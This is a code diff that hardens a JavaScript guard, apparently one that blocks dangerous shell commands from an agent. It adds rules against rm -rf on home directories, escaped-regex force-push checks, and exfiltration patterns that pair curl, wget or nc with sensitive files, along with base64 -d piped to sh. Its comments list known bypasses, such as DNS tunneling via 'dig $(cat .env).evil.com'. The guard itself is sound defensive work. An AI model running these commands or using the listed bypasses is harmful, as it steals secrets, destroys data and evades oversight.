@@ -118,6 +118,14 @@ function checkDestructiveRm(cmd) {
     if (/\s\/(\s|$|\*)/.test(cmd) || /\s\/\*/.test(cmd)) {
       return 'Blocked: rm -rf targeting root filesystem';
     }
+    // H-5: Block rm -rf targeting home directory
+    if (/\s~(\/|\s|$)/.test(cmd) || /\s\$HOME\b/.test(cmd)) {
+      return 'Blocked: rm -rf targeting home directory';
+    }
+    // H-5: Block rm -rf targeting /home/ or /Users/ (all user directories)
+    if (/\s\/home(\/|\s|$)/.test(cmd) || /\s\/Users(\/|\s|$)/.test(cmd)) {
+      return 'Blocked: rm -rf targeting user directories';
+    }
   }
   return null;
 }
@@ -131,8 +139,10 @@ function checkForceGitPush(cmd) {
   if (!hasForce) return null;
 
   for (const branch of PROTECTED_BRANCHES) {
+    // H-4: Escape regex metacharacters in branch names to prevent ReDoS / bypass
+    const escaped = branch.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
     // "git push -f origin main" or "git push --force origin master"
-    if (new RegExp(`\\b${branch}\\b`).test(cmd)) {
+    if (new RegExp(`\\b${escaped}\\b`).test(cmd)) {
       return `Blocked: force push to protected branch "${branch}"`;
     }
   }
@@ -221,18 +231,54 @@ function checkDiskWiper(cmd) {
 }
 
 /**
- * Blocks curl/wget/nc posting sensitive files.
+ * Blocks curl/wget/nc posting sensitive files and common exfiltration bypass patterns.
+ *
+ * Known limitations:
+ * - Cannot detect exfiltration via DNS tunneling (e.g., dig $(cat .env).evil.com)
+ * - Cannot detect exfiltration via encoded variable expansion (e.g., eval "$encoded")
+ * - Cannot detect exfiltration split across multiple separate commands
+ * - Inline script detection (python3 -c, node -e) only checks for sensitive file refs,
+ *   not arbitrary network calls within the script string
  */
 function checkExfiltration(cmd) {
   const hasUploadTool = /\b(curl|wget|nc|ncat|netcat)\b/.test(cmd);
-  if (!hasUploadTool) return null;
 
-  for (const pattern of SENSITIVE_FILE_PATTERNS) {
-    if (pattern.test(cmd)) {
-      const match = cmd.match(pattern);
-      return `Blocked: potential exfiltration of sensitive file (matched: ${match[0]})`;
+  // H-3: Detect piped exfiltration — cat <sensitive> | curl/wget/nc (across full command)
+  if (hasUploadTool) {
+    for (const pattern of SENSITIVE_FILE_PATTERNS) {
+      if (pattern.test(cmd)) {
+        const match = cmd.match(pattern);
+        return `Blocked: potential exfiltration of sensitive file (matched: ${match[0]})`;
+      }
     }
   }
+
+  // H-3: Detect cat <sensitive> piped to network tool (checks across pipe boundaries)
+  const fullNormalized = cmd;
+  if (/\bcat\b/.test(fullNormalized) && /\|/.test(fullNormalized) && hasUploadTool) {
+    for (const pattern of SENSITIVE_FILE_PATTERNS) {
+      if (pattern.test(fullNormalized)) {
+        const match = fullNormalized.match(pattern);
+        return `Blocked: piped exfiltration of sensitive file (matched: ${match[0]})`;
+      }
+    }
+  }
+
+  // H-3: Detect encoded command execution — base64 decode piped to shell
+  if (/\bbase64\b.*-d\b/.test(cmd) && /\|\s*(sh|bash|zsh)\b/.test(cmd)) {
+    return 'Blocked: base64-decoded command execution (base64 -d | sh)';
+  }
+
+  // H-3: Detect inline script execution referencing sensitive files
+  if (/\b(python3?|node)\s+(-c|-e)\b/.test(cmd)) {
+    for (const pattern of SENSITIVE_FILE_PATTERNS) {
+      if (pattern.test(cmd)) {
+        const match = cmd.match(pattern);
+        return `Blocked: inline script referencing sensitive file (matched: ${match[0]})`;
+      }
+    }
+  }
+
   return null;
 }
 
@@ -262,6 +308,12 @@ function runChecks(command) {
       if (reason) return reason;
     }
   }
+
+  // H-3: Run exfiltration check against the full normalized command
+  // so piped patterns (cat .env | curl ...) are detected across pipe boundaries
+  const fullReason = checkExfiltration(normalized);
+  if (fullReason) return fullReason;
+
   return null;
 }
 
